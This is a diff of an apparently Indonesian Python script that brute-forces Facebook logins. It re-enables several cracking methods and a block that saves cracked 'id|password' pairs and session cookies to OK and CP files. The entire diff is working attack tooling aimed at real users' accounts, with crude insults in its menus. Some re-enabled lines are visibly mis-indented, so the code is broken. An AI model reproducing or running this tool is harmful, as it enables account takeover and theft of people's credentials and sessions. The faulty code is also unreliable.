@@ -590,17 +590,17 @@ def setting():
 		for xmud in range(bcm):
 			id2.append(muda[bcmi])
 			bcmi -=1
-#	elif hu in ['3','03']:
-#		for bacot in id:
-#			xx = random.randint(0,len(id2))
-#			id2.insert(xx,bacot)
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
 	else:
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
 	print('>> 1. Mobile ')
-#	print('>> 2. Mbasic ')
-#	print('>> 3. Touch  ')
-#	print('>> 4. Mtouch ')
+	print('>> 2. FREE ')
+	print('>> 3. Touch  ')
+    print('>> 4. Mtouch ')
 	print('')
 	hc = input('>> Pilih : ')
 	if hc in ['1','01']:
@@ -608,10 +608,10 @@ def setting():
 	elif hc in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		setting()
-#	elif hc in ['2','02']:
-#		method.append('free')
-#	elif hc in ['3','03']:
-#		method.append('touch')
+	elif hc in ['2','02']:
+		method.append('free')
+	elif hc in ['3','03']:
+		method.append('touch')
 	elif hc in ['4','04']:
 		method.append('mbasic')
 	else:
@@ -690,7 +690,7 @@ def passwrd():
 		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
 		time.sleep(2)
 		exit()
-#--------------------[ METODE-B-API ]-----------------#
+#--------------------[ METODE-MOBILE ]-----------------#
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
@@ -758,7 +758,7 @@ def crack(idf,pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(1)
 	loop+=1
-#------------------[ METHODE-MBASIC-2 ]-------------------#
+#------------------[ METHODE-FREE ]-------------------#
 def crackfree(idf,pwv):
 	global loop,ok,cp
 	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
@@ -815,30 +815,30 @@ def crackfree(idf,pwv):
 			time.sleep(1)
 	loop+=1
 
-#			if "checkpoint" in po.cookies.get_dict().keys():
-#				print(f'\r{K}>> {idf}|{pw}{N}')     
-#				os.popen('play-audio .cp.mp3')
-#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-#				akun.append(idf+'|'+pw)
-#				cp+=1
-#				break
-#			elif "c_user" in ses.cookies.get_dict().keys():
-#				ok+=1
-#				coki=po.cookies.get_dict()
-#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
-#				os.popen('play-audio .ok.mp3')
-#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-#				cek_apk(session,coki)
-#				break
-#				
-#			else:
-#				continue
-#		except requests.exceptions.ConnectionError:
-#			time.sleep(31)
-#	loop+=1
+			if "checkpoint" in po.cookies.get_dict().keys():
+			print(f'\r{K}>> {idf}|{pw}{N}')     
+				os.popen('play-audio .cp.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
+				os.popen('play-audio .ok.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(session,coki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 
-#---------------------[ METHODE-TOUCH-3 ]---------------------#
+#---------------------[ METHODE3-TOUCH-3 ]---------------------#
 def cracktouch(idf,pwv):
 	global loop,ok,cp
 	bi = random.choice([u,k,kk,b,h,hh])
@@ -921,7 +921,7 @@ def cracktouch(idf,pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
+#----------------------[ METHODE4-MBASIC ]-----------------#
 def crackmbasic(idf,pwv):
 	global loop,ok,cp
 	bi = random.choice([u,k,kk,b,h,hh])
@@ -957,7 +957,7 @@ def crackmbasic(idf,pwv):
 				else:continue
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
+				headapp={"user-agent":"SupportsFresco=1 Mozilla/5.0 (Linux; Android 9; vivo 1902) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
